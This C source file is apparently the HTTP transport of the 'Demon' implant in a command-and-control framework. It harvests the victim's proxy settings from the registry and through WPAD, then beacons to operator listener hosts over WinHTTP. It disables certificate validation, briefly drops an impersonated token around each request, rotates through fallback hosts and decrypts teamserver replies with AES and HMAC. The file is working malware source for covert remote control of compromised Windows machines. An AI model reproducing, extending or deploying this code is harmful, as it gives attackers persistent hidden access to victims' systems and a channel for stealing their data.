#include <Demon.h>

#include <core/TransportHttp.h>
#include <core/MiniStd.h>
/* [HVC-029] WireDecode for authenticated + encrypted response processing. */
#include <crypt/WireEncoder.h>

#ifdef TRANSPORT_HTTP

/*!
 * @brief
 *  Read Windows system proxy settings at agent startup.
 *
 *  Primary path: direct Advapi32 registry read of
 *    HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings
 *    (ProxyEnable, ProxyServer). No WinHTTP dependency.
 *
 *  Secondary path: if no manual registry proxy is found and LookedForProxy
 *    remains FALSE, the WinHTTP WPAD/IE detection in HttpSend() fires once
 *    on the first request (guarded by Config.Transport.Proxy.AutoDetect).
 *
 *  Called from DemonInit() immediately after DemonConfig() when AutoDetect
 *  is TRUE. Requires Advapi32 to be loaded (RtAdvapi32() must have run).
 */
VOID HttpAutoProxyDetect( VOID )
{
    HKEY  hKey           = NULL;
    DWORD dwType         = 0;
    DWORD dwProxyEnable  = 0;
    DWORD dwSize         = sizeof( DWORD );
    WCHAR ProxyServer[ 512 ]   = { 0 };
    WCHAR AutoConfigUrl[ 512 ] = { 0 };
    DWORD cbProxyServer  = sizeof( ProxyServer );
    DWORD cbAutoConfig   = sizeof( AutoConfigUrl );
    LONG  Status         = 0;

    HKEY HKCU = (HKEY)(ULONG_PTR) 0x80000001UL; /* HKEY_CURRENT_USER predefined handle */

    PUTS( "[PROXY] AutoDetect: reading HKCU Internet Settings" )

    Status = Instance->Win32.RegOpenKeyExW(
        HKCU,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
        0,
        KEY_READ,
        &hKey
    );
    if ( Status != ERROR_SUCCESS ) {
        PRINTF_DONT_SEND( "[PROXY] RegOpenKeyExW failed: %ld\n", Status )
        goto LEAVE;
    }

    /* check ProxyEnable DWORD */
    dwType = REG_DWORD;
    dwSize = sizeof( DWORD );
    if ( Instance->Win32.RegQueryValueExW( hKey, L"ProxyEnable", NULL, &dwType, (PBYTE)&dwProxyEnable, &dwSize ) == ERROR_SUCCESS
         && dwType == REG_DWORD && dwProxyEnable )
    {
        /* manual proxy is set — read the ProxyServer string */
        dwType       = REG_SZ;
        cbProxyServer = sizeof( ProxyServer );
        if ( Instance->Win32.RegQueryValueExW( hKey, L"ProxyServer", NULL, &dwType, (PBYTE)ProxyServer, &cbProxyServer ) == ERROR_SUCCESS
             && dwType == REG_SZ && StringLengthW( ProxyServer ) > 0 )
        {
            /*
             * ProxyServer may be "host:port" or "http=host:port;https=host:port;..."
             * Scan for the "http=" entry; fall back to the raw string if not found.
             */
            LPWSTR ParsedProxy = ProxyServer;
            ULONG  PrefixLen   = 5; /* L"http=" */

            for ( LPWSTR p = ProxyServer; *p; p++ ) {
                if ( StringLengthW( p ) < 5 ) break; /* bounds guard before p[1..4] */
                if ( p[0] == L'h' && p[1] == L't' && p[2] == L't' && p[3] == L'p' && p[4] == L'=' ) {
                    LPWSTR HttpEntry = p + PrefixLen;
                    /* trim at next ';' */
                    for ( LPWSTR q = HttpEntry; *q; q++ ) {
                        if ( *q == L';' ) { *q = L'\0'; break; }
                    }
                    ParsedProxy = HttpEntry;
                    break;
                }
            }

            /* build full URL: prepend "http://" if the string has no "://" scheme marker */
            {
                BOOL  HasScheme  = FALSE;
                ULONG k;
                for ( k = 0; k < 10 && ParsedProxy[ k ]; k++ ) {
                    if ( ParsedProxy[k] == L':' && ParsedProxy[k+1] == L'/' && ParsedProxy[k+2] == L'/' ) {
                        HasScheme = TRUE;
                        break;
                    }
                }

                DWORD UrlBufChars = StringLengthW( ParsedProxy ) + 8; /* worst case: "http://" + NUL */
                Instance->Config.Transport.Proxy.Url = MmHeapAlloc( UrlBufChars * sizeof( WCHAR ) );

                if ( HasScheme ) {
                    MemCopy( Instance->Config.Transport.Proxy.Url, ParsedProxy, StringLengthW( ParsedProxy ) * sizeof( WCHAR ) );
                } else {
                    MemCopy( Instance->Config.Transport.Proxy.Url,     L"http://", 7 * sizeof( WCHAR ) );
                    MemCopy( Instance->Config.Transport.Proxy.Url + 7, ParsedProxy, StringLengthW( ParsedProxy ) * sizeof( WCHAR ) );
                }
            }

            Instance->Config.Transport.Proxy.Enabled = TRUE;
            Instance->LookedForProxy                  = TRUE;

            PRINTF( "[PROXY] Registry proxy: %ls\n", Instance->Config.Transport.Proxy.Url )
            goto LEAVE;
        }
    }

    /* check AutoConfigURL (PAC file) — log only; WinHTTP WPAD in HttpSend() resolves it */
    dwType     = REG_SZ;
    cbAutoConfig = sizeof( AutoConfigUrl );
    if ( Instance->Win32.RegQueryValueExW( hKey, L"AutoConfigURL", NULL, &dwType, (PBYTE)AutoConfigUrl, &cbAutoConfig ) == ERROR_SUCCESS
         && dwType == REG_SZ && StringLengthW( AutoConfigUrl ) > 0 )
    {
        PRINTF( "[PROXY] PAC URL found: %ls (WinHTTP resolves at first connect)\n", AutoConfigUrl )
        /* LookedForProxy stays FALSE so HttpSend's WinHTTP WPAD block fires once */
    }

LEAVE:
    if ( hKey ) Instance->Win32.RegCloseKey( hKey );
}

/*!
 * @brief
 *  send a http request
 *
 * @param Send
 *  buffer to send
 *
 * @param Resp
 *  buffer response
 *
 * @return
 *  if successful send request
 */
BOOL HttpSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
) {
    HANDLE  Connect        = { 0 };
    HANDLE  Request        = { 0 };
    LPWSTR  HttpHeader     = { 0 };
    LPWSTR  HttpEndpoint   = { 0 };
    DWORD   HttpFlags      = { 0 };
    LPCWSTR HttpProxy      = { 0 };
    PWSTR   HttpScheme     = { 0 };
    DWORD   Counter        = { 0 };
    DWORD   Iterator       = { 0 };
    DWORD   BufRead        = { 0 };
    UCHAR   Buffer[ 1024 ] = { 0 };
    PVOID   RespBuffer     = { 0 };
    SIZE_T  RespSize       = { 0 };
    BOOL    Successful     = { 0 };

    WINHTTP_PROXY_INFO                   ProxyInfo        = { 0 };
    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig      = { 0 };
    WINHTTP_AUTOPROXY_OPTIONS            AutoProxyOptions = { 0 };

    /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
    TokenImpersonate( FALSE );

    /* if we don't have any more hosts left, then exit */
    if ( ! Instance->Config.Transport.Host ) {
        PUTS_DONT_SEND( "No hosts left to use... exit now." )
        CommandExit( NULL );
    }

    if ( ! Instance->hHttpSession ) {
        if ( Instance->Config.Transport.Proxy.Enabled ) {
            // Use preconfigured proxy
            HttpProxy = Instance->Config.Transport.Proxy.Url;

            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NAMED_PROXY, %ls, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance->Config.Transport.UserAgent, HttpProxy ) */
            Instance->hHttpSession = Instance->Win32.WinHttpOpen( Instance->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
        } else {
            // Autodetect proxy settings
            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance->Config.Transport.UserAgent ) */
            Instance->hHttpSession = Instance->Win32.WinHttpOpen( Instance->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
        }

        if ( ! Instance->hHttpSession ) {
            PRINTF_DONT_SEND( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
            goto LEAVE;
        }
    }

    /* PRINTF_DONT_SEND( "WinHttpConnect( %x, %ls, %d, 0 )\n", Instance->hHttpSession, Instance->Config.Transport.Host->Host, Instance->Config.Transport.Host->Port ) */
    if ( ! ( Connect = Instance->Win32.WinHttpConnect(
        Instance->hHttpSession,
        Instance->Config.Transport.Host->Host,
        Instance->Config.Transport.Host->Port,
        0
    ) ) ) {
        PRINTF_DONT_SEND( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
        goto LEAVE;
    }

    while ( TRUE ) {
        if ( ! Instance->Config.Transport.Uris[ Counter ] ) {
            break;
        } else {
            Counter++;
        }
    }

    HttpEndpoint = Instance->Config.Transport.Uris[ RandomNumber32() % Counter ];
    HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    if ( Instance->Config.Transport.Secure ) {
        HttpFlags |= WINHTTP_FLAG_SECURE;
    }

    /* PRINTF_DONT_SEND( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %x )\n", hConnect, Instance->Config.Transport.Method, HttpEndpoint, HttpFlags ) */
    if ( ! ( Request = Instance->Win32.WinHttpOpenRequest(
        Connect,
        Instance->Config.Transport.Method,
        HttpEndpoint,
        NULL,
        NULL,
        NULL,
        HttpFlags
    ) ) ) {
        PRINTF_DONT_SEND( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() )
        goto LEAVE;
    }

    if ( Instance->Config.Transport.Secure ) {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
        {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }
    }

    /* Add our headers */
    do {
        HttpHeader = Instance->Config.Transport.Headers[ Iterator ];

        if ( ! HttpHeader )
            break;

        if ( ! Instance->Win32.WinHttpAddRequestHeaders( Request, HttpHeader, -1, WINHTTP_ADDREQ_FLAG_ADD ) ) {
            PRINTF_DONT_SEND( "Failed to add header: %ls", HttpHeader )
        }

        Iterator++;
    } while ( TRUE );

    if ( Instance->Config.Transport.Proxy.Enabled ) {

        // Use preconfigured proxy
        ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        ProxyInfo.lpszProxy    = Instance->Config.Transport.Proxy.Url;

        if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( WINHTTP_PROXY_INFO ) ) ) {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }

        if ( Instance->Config.Transport.Proxy.Username ) {
            if ( ! Instance->Win32.WinHttpSetOption(
                Request,
                WINHTTP_OPTION_PROXY_USERNAME,
                Instance->Config.Transport.Proxy.Username,
                StringLengthW( Instance->Config.Transport.Proxy.Username )
            ) ) {
                PRINTF_DONT_SEND( "Failed to set proxy username %u", NtGetLastError() );
            }
        }

        if ( Instance->Config.Transport.Proxy.Password ) {
            if ( ! Instance->Win32.WinHttpSetOption(
                Request,
                WINHTTP_OPTION_PROXY_PASSWORD,
                Instance->Config.Transport.Proxy.Password,
                StringLengthW( Instance->Config.Transport.Proxy.Password )
            ) ) {
                PRINTF_DONT_SEND( "Failed to set proxy password %u", NtGetLastError() );
            }
        }

    } else if ( ! Instance->LookedForProxy && Instance->Config.Transport.Proxy.AutoDetect ) {
        // Autodetect proxy settings using the Web Proxy Auto-Discovery (WPAD) protocol

        /*
         * NOTE: We use WinHttpGetProxyForUrl as the first option because
         *       WinHttpGetIEProxyConfigForCurrentUser can fail with certain users
         *       and also the documentation states that WinHttpGetIEProxyConfigForCurrentUser
         *       "can be used as a fall-back mechanism" so we are using it that way
         */

        /* WinHttpGetProxyForUrl requires a full URL (scheme://host:port/path).
         * Passing only the URI path (HttpEndpoint) causes WPAD/PAC evaluation
         * to silently fail because there is no host for the script to match against. */
        WCHAR WpadUrl[ 512 ] = { 0 };
        WCHAR PortBuf[ 8 ]   = { 0 };
        {
            LPWSTR Scheme    = Instance->Config.Transport.Secure ? L"https" : L"http";
            DWORD  SchemeLen = Instance->Config.Transport.Secure ? 5 : 4;
            DWORD  HostLen   = StringLengthW( Instance->Config.Transport.Host->Host );
            DWORD  PathLen   = StringLengthW( HttpEndpoint );
            DWORD  PortLen   = 0;
            DWORD  Offset    = 0;
            WORD   Port      = (WORD) Instance->Config.Transport.Host->Port;

            /* WORD → wide decimal string without stdlib */
            if ( Port == 0 ) {
                PortBuf[ 0 ] = L'0'; PortLen = 1;
            } else {
                WCHAR tmp[ 6 ] = { 0 };
                DWORD i        = 5;
                WORD  p        = Port;
                while ( p > 0 ) { tmp[ --i ] = L'0' + (p % 10); p /= 10; }
                while ( tmp[ i ] ) { PortBuf[ PortLen++ ] = tmp[ i++ ]; }
            }

            MemCopy( WpadUrl + Offset, Scheme,                                SchemeLen * sizeof(WCHAR) ); Offset += SchemeLen;
            MemCopy( WpadUrl + Offset, L"://",                                3         * sizeof(WCHAR) ); Offset += 3;
            MemCopy( WpadUrl + Offset, Instance->Config.Transport.Host->Host, HostLen   * sizeof(WCHAR) ); Offset += HostLen;
            WpadUrl[ Offset++ ] = L':';
            MemCopy( WpadUrl + Offset, PortBuf,      PortLen * sizeof(WCHAR) ); Offset += PortLen;
            MemCopy( WpadUrl + Offset, HttpEndpoint, PathLen * sizeof(WCHAR) );
        }

        AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
        AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
        AutoProxyOptions.lpszAutoConfigUrl      = NULL;
        AutoProxyOptions.lpvReserved            = NULL;
        AutoProxyOptions.dwReserved             = 0;
        AutoProxyOptions.fAutoLogonIfChallenged = TRUE;

        if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, WpadUrl, &AutoProxyOptions, &ProxyInfo ) ) {
            if ( ProxyInfo.lpszProxy ) {
                PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
            }

            Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
            Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
            MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
        } else {
            // WinHttpGetProxyForUrl failed, use WinHttpGetIEProxyConfigForCurrentUser as fall-back
            if ( Instance->Win32.WinHttpGetIEProxyConfigForCurrentUser( &ProxyConfig ) ) {
                if ( ProxyConfig.lpszProxy != NULL && StringLengthW( ProxyConfig.lpszProxy ) != 0 ) {
                    // IE is set to "use a proxy server"
                    ProxyInfo.dwAccessType    = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                    ProxyInfo.lpszProxy       = ProxyConfig.lpszProxy;
                    ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;

                    PRINTF_DONT_SEND( "Using IE proxy %ls\n", ProxyInfo.lpszProxy );

                    Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                    Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
                    MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );

                    // don't cleanup these values
                    ProxyConfig.lpszProxy       = NULL;
                    ProxyConfig.lpszProxyBypass = NULL;
                } else if ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 ) {
                    // IE is set to "Use automatic proxy configuration"
                    AutoProxyOptions.dwFlags           = WINHTTP_AUTOPROXY_CONFIG_URL;
                    AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
                    AutoProxyOptions.dwAutoDetectFlags = 0;

                    PRINTF_DONT_SEND( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );

                    if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, WpadUrl, &AutoProxyOptions, &ProxyInfo ) ) {
                        if ( ProxyInfo.lpszProxy ) {
                            PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
                        }

                        Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                        Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
                        MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
                    }
                } else {
                    // IE is set to "automatically detect settings"
                    // ignore this as we already tried
                }
            }
        }

        Instance->LookedForProxy = TRUE;
    }

    if ( Instance->ProxyForUrl ) {
        if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, Instance->ProxyForUrl, Instance->SizeOfProxyForUrl ) ) {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }
    }

    /* [HVC-029] Send->Buffer is already a base64-encoded blob produced by WireEncode
     * in PackageTransmitAll.  No additional base64 encoding is needed here. */
    PRINTF( "TransportSend: WinHttpSendRequest body=%lu bytes (base64, from WireEncode)\n", (unsigned long) Send->Length )

    /* Send package to our listener */
    if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, Send->Buffer, (DWORD) Send->Length, (DWORD) Send->Length, 0 ) ) {
        if ( Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
            /* Is the server recognizing us ? are we good ?  */
            DWORD _statusCode = HttpQueryStatus( Request );
            PRINTF( "TransportSend: HTTP status=%lu\n", (unsigned long) _statusCode )
            if ( _statusCode != HTTP_STATUS_OK ) {
                PUTS_DONT_SEND( "HttpQueryStatus Failed: Is not HTTP_STATUS_OK (200)" )
                Successful = FALSE;
                goto LEAVE;
            }

            if ( Resp ) {
                RespBuffer = NULL;

                //
                // read the entire response into the Resp BUFFER
                //
                do {
                    Successful = Instance->Win32.WinHttpReadData( Request, Buffer, sizeof( Buffer ), &BufRead );
                    if ( ! Successful || BufRead == 0 ) {
                        break;
                    }

                    if ( ! RespBuffer ) {
                        RespBuffer = Instance->Win32.LocalAlloc( LPTR, BufRead );
                    } else {
                        RespBuffer = Instance->Win32.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );
                    }

                    RespSize += BufRead;

                    MemCopy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
                    MemSet( Buffer, 0, sizeof( Buffer ) );
                } while ( Successful == TRUE );

                PRINTF( "TransportSend: response body=%lu bytes (base64+HMAC, from WireDecode)\n", (unsigned long) RespSize )

                /* [HVC-029] Authenticate, decrypt, and decode the teamserver response
                 * using WireDecode.  Expected format:
                 *   base64( [IV(16) | AES-CTR(payload) | HMAC-SHA256(32)] )
                 * WireDecode verifies HMAC (constant-time) before decrypting. */
                {
                    UCHAR  RespMacKey[ HMAC_SHA256_SIZE ];
                    PVOID  DecodedBuf  = NULL;
                    SIZE_T DecodedSize = 0;

                    HmacSha256( Instance->Config.AES.Key, 32,
                                (PUCHAR)"mac", 3,
                                RespMacKey );

                    if ( ! WireDecode( (PBYTE) RespBuffer, RespSize,
                                       Instance->Config.AES.Key, RespMacKey,
                                       (PBYTE*) &DecodedBuf, &DecodedSize ) )
                    {
                        PUTS_DONT_SEND( "WireDecode failed (HMAC mismatch or alloc error)" )
                        MemSet( RespMacKey, 0, sizeof( RespMacKey ) );
                        MemSet( RespBuffer, 0, RespSize );
                        Instance->Win32.LocalFree( RespBuffer );
                        Successful = FALSE;
                        goto LEAVE;
                    }

                    MemSet( RespMacKey, 0, sizeof( RespMacKey ) );
                    MemSet( RespBuffer, 0, RespSize );
                    Instance->Win32.LocalFree( RespBuffer );

                    Resp->Length = (UINT32) DecodedSize;
                    Resp->Buffer = DecodedBuf;
                    PRINTF( "TransportSend: response decoded=%lu bytes\n", (unsigned long) DecodedSize )
                }

                Successful = TRUE;
            }
        }
    } else {
        if ( NtGetLastError() == ERROR_INTERNET_CANNOT_CONNECT ) {
            Instance->Session.Connected = FALSE;
        }

        PRINTF_DONT_SEND( "HTTP Error: %d\n", NtGetLastError() )
        PRINTF( "TransportSend: WinHttpSendRequest FAILED LastError=%lu\n",
                (unsigned long) NtGetLastError() )
    }

LEAVE:
    if ( Connect ) {
        Instance->Win32.WinHttpCloseHandle( Connect );
    }

    if ( Request ) {
        Instance->Win32.WinHttpCloseHandle( Request );
    }

    if ( ProxyConfig.lpszProxy ) {
        Instance->Win32.GlobalFree( ProxyConfig.lpszProxy );
    }

    if ( ProxyConfig.lpszProxyBypass ) {
        Instance->Win32.GlobalFree( ProxyConfig.lpszProxyBypass );
    }

    if ( ProxyConfig.lpszAutoConfigUrl ) {
        Instance->Win32.GlobalFree( ProxyConfig.lpszAutoConfigUrl );
    }

    /* re-impersonate the token */
    TokenImpersonate( TRUE );

    if ( ! Successful ) {
        /* if we hit our max then we use our next host */
        Instance->Config.Transport.Host = HostFailure( Instance->Config.Transport.Host );
    }

    return Successful;
}

/*!
 * @brief
 *  Query the Http Status code from the request response.
 *
 * @param hRequest
 *  request handle
 *
 * @return
 *  Http status code
 */
DWORD HttpQueryStatus(
    _In_ HANDLE Request
) {
    DWORD StatusCode = 0;
    DWORD StatusSize = sizeof( DWORD );

    if ( Instance->Win32.WinHttpQueryHeaders(
        Request,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &StatusCode,
        &StatusSize,
        WINHTTP_NO_HEADER_INDEX
    ) ) {
        return StatusCode;
    }

    return 0;
}

PHOST_DATA HostAdd(
    _In_ LPWSTR Host, SIZE_T Size, DWORD Port )
{
    PRINTF_DONT_SEND( "Host -> Host:[%ls] Size:[%ld] Port:[%ld]\n", Host, Size, Port );

    PHOST_DATA HostData = NULL;

    HostData       = MmHeapAlloc( sizeof( HOST_DATA ) );
    HostData->Host = MmHeapAlloc( Size + sizeof( WCHAR ) );
    HostData->Port = Port;
    HostData->Dead = FALSE;
    HostData->Next = Instance->Config.Transport.Hosts;

    /* Copy host to our buffer */
    MemCopy( HostData->Host, Host, Size );

    /* Add to hosts linked list */
    Instance->Config.Transport.Hosts = HostData;

    return HostData;
}

PHOST_DATA HostFailure( PHOST_DATA Host )
{
    if ( ! Host )
        return NULL;

    if ( Host->Failures == Instance->Config.Transport.HostMaxRetries )
    {
        /* we reached our max failed retries with our current host data
         * use next one */
        Host->Dead = TRUE;

        /* Get our next host based on our rotation strategy. */
        return HostRotation( Instance->Config.Transport.HostRotation );
    }

    /* Increase our failed counter */
    Host->Failures++;

    PRINTF_DONT_SEND( "Host [Host: %ls:%ld] failure counter increased to %d\n", Host->Host, Host->Port, Host->Failures )

    return Host;
}

/* Gets a random host from linked list. */
PHOST_DATA HostRandom()
{
    PHOST_DATA Host  = NULL;
    DWORD      Index = RandomNumber32() % HostCount();
    DWORD      Count = 0;

    Host = Instance->Config.Transport.Hosts;

    for ( ;; )
    {
        if ( Count == Index )
            break;

        if ( ! Host )
            break;

        /* if we are the end and still didn't found the random index quit. */
        if ( ! Host->Next )
        {
            Host = NULL;
            break;
        }

        Count++;

        /* Next host please */
        Host = Host->Next;
    }

    PRINTF_DONT_SEND( "Index: %d\n", Index )
    PRINTF_DONT_SEND( "Host : %p (%ls:%ld :: Dead[%s] :: Failures[%d])\n", Host, Host->Host, Host->Port, Host->Dead ? "TRUE" : "FALSE", Host->Failures )

    return Host;
}

PHOST_DATA HostRotation( SHORT Strategy )
{
    PHOST_DATA Host = NULL;

    if ( Instance->Config.Transport.NumHosts > 1 )
    {
        /*
         * Different CDNs can have different WPAD rules.
         * After rotating, look for the proxy again
         */
        Instance->LookedForProxy = FALSE;
    }

    if ( Strategy == TRANSPORT_HTTP_ROTATION_ROUND_ROBIN )
    {
        DWORD Count = 0;

        /* get linked list */
        Host = Instance->Config.Transport.Hosts;

        /* If our current host is empty
         * then return the top host from our linked list. */
        if ( ! Instance->Config.Transport.Host )
            return Host;

        for ( Count = 0; Count < HostCount();  )
        {
            /* check if it's not an empty pointer */
            if ( ! Host )
                break;

            /* if the host is dead (max retries limit reached) then continue */
            if ( Host->Dead )
                Host = Host->Next;
            else break;
        }
    }
    else if ( Strategy == TRANSPORT_HTTP_ROTATION_RANDOM )
    {
        /* Get a random Host */
        Host = HostRandom();

        /* if we fail use the first host we get available. */
        if ( Host->Dead )
            /* fallback to Round Robin */
            Host = HostRotation( TRANSPORT_HTTP_ROTATION_ROUND_ROBIN );
    }

    /* if we specified infinite retries then reset every "Failed" retries in our linked list and do this forever...
     * as the operator wants. */
    if ( ( Instance->Config.Transport.HostMaxRetries == 0 ) && ! Host )
    {
        PUTS_DONT_SEND( "Specified to keep going. To infinity... and beyond" )

        /* get linked list */
        Host = Instance->Config.Transport.Hosts;

        /* iterate over linked list */
        for ( ;; )
        {
            if ( ! Host )
                break;

            /* reset failures */
            Host->Failures = 0;
            Host->Dead     = FALSE;

            Host = Host->Next;
        }

        /* tell the caller to start at the beginning */
        Host = Instance->Config.Transport.Hosts;
    }

    return Host;
}

DWORD HostCount()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;

    Head = Instance->Config.Transport.Hosts;
    Host = Head;

    do {

        if ( ! Host )
            break;

        Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        if ( Head == Host )
            break;

    } while ( TRUE );

    return Count;
}

BOOL HostCheckup()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;
    BOOL       Alive = TRUE;

    Head = Instance->Config.Transport.Hosts;
    Host = Head;

    do {
        if ( ! Host )
            break;

        if ( Host->Dead )
            Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        if ( Head == Host )
            break;
    } while ( TRUE );

    /* check if every host is dead */
    if ( HostCount() == Count )
        Alive = FALSE;

    return Alive;
}
#endif
